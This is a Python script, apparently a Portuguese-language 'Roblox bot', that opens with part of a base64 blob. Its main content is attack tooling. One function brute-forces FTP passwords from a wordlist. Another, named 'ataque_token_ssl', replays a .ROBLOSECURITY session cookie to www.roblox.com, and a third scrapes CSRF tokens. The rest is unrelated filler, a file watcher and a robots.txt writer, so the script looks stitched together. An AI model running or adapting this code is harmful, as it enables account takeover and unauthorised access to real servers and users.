oaWZ0ciIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnNoaWZ0ci5kZiIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5zYW1zdW5nIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlciIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIuemFuIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5kZXYiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRhaWx5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIucmMiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRlYnVnIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5wcmV2aWV3IiwNCiAgICAiY29tLm1pY3Jvc29mdC5tc2FwcHMiLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmciLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmdkb2dmb29kIiwNCiAgICAiY29tLm1pY3Jvc29mdC50b2RvcyIsDQogICAgImNvbS5taWNyb3NvZnQudG9kb3Mud2Vla2x5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5uZXh0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vdXRsb29rZ3JvdXBzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMuaW50ZWdyYXRpb24iLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMucHJlYWxwaGEiLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmFscGhhIiwNCiAgICAiY29tLm1pY3Jvc29mdC50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuYW1wLmFwcHMuYmluZ2ZpbmFuY2UiLA0KICAgICJjb20ubWljcm9zb2Z0LmFtcC5hcHBzLmJpbmduZXdzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nc3BvcnRzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nd2VhdGhlciIsDQogICAgImNvbS55YW1tZXIudjEiLA0KICAgICJjb20ueWFtbWVyLnYxLm5pZ2h0bHkiLA0KICAgICJjb20ubWljcm9zb2Z0Lm8zNjVzbWIuY29ubmVjdGlvbnMiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkubG9jYWwiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkuZGFpbHkiLA0KICAgICJjb20ubWljcm9zb2Z0LmludGVybmV0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5ydWJ5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5lZGdlIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tbXguc2RrZGVtbyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kZXZlbG9wbWVudCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5iZXRhIiwNCiAgICAiY29tLm1pY3Jvc29mdC5lbW14LmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5jYW5hcnkiLA0KICAgICJjb20ubWljcm9zb2Z0LmVtbXgucm9sbGluZyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5sb2NhbCIsDQogICAgImNvbS5taWNyb3NvZnQuZmxvdyIsDQogICAgImNvbS50b3VjaHR5cGUuc3dpZnRrZXkiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmJldGEiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmNlc2FyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hcHBtYW5hZ2VyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tb2JpbGUucG9seW1lciIsDQogICAgImNvbS5taWNyb3NvZnQuZHluYW1pY3MuaW52b2ljZSIsDQogICAgImNvbS5taWNyb3NvZnQucGxhbm5lciIsDQogICAgImNvbS5taWNyb3NvZnQub25lYXV0aC50ZXN0YXBwIiwNCiAgICAiY29tLm9lbWEwLm1zYXNpZ25pbiIsDQogICAgImNvbS5taWNyb3NvZnQuZGVsdmVtb2JpbGUiLA0KICAgICJjb20ubWljcm9zb2Z0LnN1cmZhY2UubXNhc2lnbmluIiwNCiAgICAiY29tLnN1cmZhY2UuZmVlZGJhY2thcHAiLA0KICAgICJjb20ubWljcm9zb2Z0LnNjbXgiLA0KICAgICJjb20ubWljcm9zb2Z0LnN0cmVhbSIsDQogICAgImNvbS5taWNyb3NvZnQuYW5kcm9pZC5jbG91ZGNvbm5lY3QiLA0KICAgICJjb20ubWljcm9zb2Z0Lmxpc3RzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5saXN0cy5wdWJsaWMiDQogIF0NCn0NCg.PbVWy/X57/176BeA27VllgAERB35PDAYCGEkKmY7xNfIQoLVpSNGeDhDor9ZViRYxkduoSOLZV6UxoQIR4VnBA+Ism7nm0tW8a6MDhJ/YKZo7BuUUz3HeVnNlHUHQlwRwgm9Qy/amGPRxQVaqGv1v6PHL510/XtO/FkAJ7hvB3Ieq/rSrG/ThRxTE3wFuUXGFelom62Re3s/FDnlOoxjYsxAmf/QqPoSX9gehVfbeb+FRJAO1WS8YfB4DwL/5QPmxaX98uORr8y9zEJNxefIQWJrEmWxDTcdNIHTodgMXP8uG3wnF0FemHzsx89rcSUUZmOUoXs17mM7zdn0gnk/4B3oPqRbrNGt8Vx/g2HRWJswjqm0Qe3ZALTwZt1iar6nqwQLsCNCKsvZwHCONGIGzdVz/2g8KXpa858ajbwna3eCLZZjmU00uX/nDbJIihxNU4ZVgebvNmoRS7QFnl/cTGj2bx9MTclk7k2XpI7kLaFm9rEuumm17TSHZjSl6dJwQG3uSJ2FYFOf0y5H2IlYk9d6g/pHTQ4cuJFgZDG60WG1a3xJiEa3T/98c2kyiR5s+ZIT5rgJFeiCGS0zikfMseem5cqlUK3o/Jq4FT9LTiPvs7kV/MQIlTQMqp4HGk2rL7z0uy1x9uQC6EUWwglIF8PsX/dB5sME27qRvDIQDAs", "2b93c3a24618363a84e2607579de9e100782e656921a8a26ed813246c77b17e9")

PATH = os.path.expanduser("~/home")

def info_log(msg):
    print(f"[INFO] {msg}")
    if FALAR:
        engine.say(msg)
        engine.runAndWait()

def erro_log(msg):
    print(f"[ERRO] {msg}")
    if FALAR:
        engine.say(msg)
        engine.runAndWait()

def bot_log(msg):
    print(f"[BOT] {msg}")
    if FALAR:
        engine.say(msg)
        engine.runAndWait()

def clearConsole():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def banner_roblox():
    print("\033[1;32m")
    print(r"""
                   ╦═╝╦╔═╝╔╔╔╔═╝╔═╝╔═╝╔╦╝
                   ╠╦╝║║ ║║║║║═╝║╓   ║
                   ╚╚═╚═╚╚═╚═╝╚═╝  ╚

       ╔════════════════════════════════════════╗
       ║         Bot inspirado por Roblox         ║
       ╠════════════════════════════════════════╝
       ║  Nome do Servidor: roblox                    ║
       ║  Website oficial: https://www.roblox.com     ║
       ╚════════════════════════════════════════╝
    """)
    print("\033[0m")

def baixar_ftp():
    try:
        with ftplib.FTP(FTP_HOST) as ftp:
            ftp.login(FTP_USER, FTP_PASS)
    except Exception as e:
        erro_log(f"Erro ao conectar FTP: {e}")

def bruteforce_ftp(host, user, wordlist):
    print(Fore.YELLOW + f"[FTP] Iniciando brute force em {host} com usuário '{user}'..." + Fore.RESET)
    for senha in wordlist:
        try:
            ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ftp.settimeout(3)
            ftp.connect((host, 21))
            ftp.recv(1024)
            ftp.send(f"USER {user}\r\n".encode())
            ftp.recv(1024)
            ftp.send(f"PASS {senha}\r\n".encode())
            resposta = ftp.recv(1024).decode()
            if "230" in resposta:
                print(Fore.GREEN + f"[SUCESSO] Senha encontrada: {senha}" + Fore.RESET)
                return senha
            elif "530" in resposta:
                print(Fore.RED + f"[FALHA] Senha incorreta: {senha}" + Fore.RESET)
            ftp.close()
        except Exception as e:
            print(Fore.RED + f"[ERRO] {e}" + Fore.RESET)
    return None

def requisicao_roblox():
    try:
        response = roblox_session.get("https://www.roblox.com", timeout=10)
        if response.status_code == 200:
            info_log("Requisição HTTPS ao Roblox realizada com sucesso!")
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find("input", {"name": "__RequestVerificationToken"})
            if token_input:
                print("[TOKEN] Token extraído:", token_input.get("value"))

            meta_token = soup.find("meta", attrs={"name": "csrf-token"})
            if meta_token and meta_token.get("content"):
                print("[TOKEN META] Token CSRF extraído:", meta_token.get("content"))
        else:
            erro_log(f"Falha na requisição: {response.status_code}")
    except Exception as e:
        erro_log(f"Erro durante requisição HTTPS ao Roblox: {e}")

def ataque_token_ssl():
    try:
        bot_log("Iniciando ataque via SSL usando TOKEN para www.roblox.com:443")
        context = ssl.create_default_context()
        with socket.create_connection(("www.roblox.com", 443)) as sock:
            with context.wrap_socket(sock, server_hostname="www.roblox.com") as ssock:
                request_line = f"GET /?token={parse.quote(TOKEN)} HTTP/1.1\r\n"
                headers = (
                    "Host: www.roblox.com\r\n"
                    "User-Agent: Mozilla/5.0 (2822MB; 720x1411; 320x319; 411x806; Samsung SM-A115F; 10) AppleWebKit/537.36 (KHTML, like Gecko)  ROBLOX Android App 2.448.411159 Phone Hybrid()  GooglePlayStore RobloxApp/2.448.411159 (GlobalDist; GooglePlayStore)\r\n"
                    "Accept: */*\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    f"Cookie: .ROBLOSECURITY={TOKEN}; rbx-ip2=1\r\n"
                    "X-CSRF-TOKEN: fetch\r\n"
                    "Connection: close\r\n\r\n"
                )
                ssock.sendall((request_line + headers).encode())
                resposta = ssock.recv(4096).decode(errors="ignore")
                bot_log("Resposta recebida de www.roblox.com:")
                print(resposta[:1000], '...')
    except Exception as e:
        erro_log(f"Erro no ataque SSL com token: {e}")

class MyHandler(FileSystemEventHandler):
    @staticmethod
    def on_any_event(event):
        if event.event_type == "created":
            print(f"Algo foi criado: {event.src_path}")
        elif event.event_type == "modified":
            print(f"Algo foi modificado: {event.src_path}")
        elif event.event_type == "deleted":
            print(f"Algo foi deletado: {event.src_path}")

class MyWatch:
    def __init__(self, path=PATH):
        if not os.path.exists(path):
            path = './'
        self.path = path
        self.observer = Observer()

    def run(self):
        handler = MyHandler()
        self.observer.schedule(handler, self.path, recursive=True)
        self.observer.start()
        print(f"Monitorando alterações em: {self.path}")
        time.sleep(10)
        self.observer.stop()
        self.observer.join()

def create_robots_txt():
    with open("robots.txt", "w") as file:
        file.write("User-agent: *\n")
        file.write("Disallow: *.ashx\n")
        file.write("Disallow: /abusereport/\n")
        file.write("Disallow: /*/abusereport/\n")
        file.write("Disallow: /admi/\n")
        file.write("Disallow: /ads/\n")
        file.write("Disallow: /catalog/contents\n")
        file.write("Disallow: /catalog/html\n")
        file.write("Disallow: /client-status\n")
        file.write("Disallow: /data/\n")
        file.write("Disallow: /error/\n")
        file.write("Disallow: /forum/\n")
        file.write("Disallow: /Forum/\n")
        file.write("Disallow: /game/report-event\n")
        file.write("Disallow: /game/report-stats\n")
        file.write("Disallow: /ide/clienttoolbox\n")
        file.write("Disallow: /javascript/\n")
        file.write("Disallow: /reports/\n")
        file.write("Disallow: /thumbnail/resolve-hash\n")
        file.write("Disallow: /thumbnail_holder/g\n")
        file.write("Disallow: /viewapp/\n")
        file.write("Disallow: /error.html\n")
        file.write("Disallow: /offline.html\n")
        file.write("Disallow: /badges/\n")
        file.write("Disallow: /*/badges/\n")
        file.write("Disallow: /*.aspx$\n")
        file.write("Disallow: /upgrades/checkout/success?giftPurchaseId=*\n")
        file.write("\nSitemap: https://www.roblox.com/sitemap.xml\n")
    print("Arquivo robots.txt criado com sucesso!")

def menu_principal():
    clearConsole()
    banner_roblox()
    requisicao_roblox()
    ataque_token_ssl()
    baixar_ftp()
    bruteforce_ftp(FTP_HOST, FTP_USER, wordlist)
    create_robots_txt()
    w = MyWatch()
    w.run()

if __name__ == "__main__":
    menu_principal()
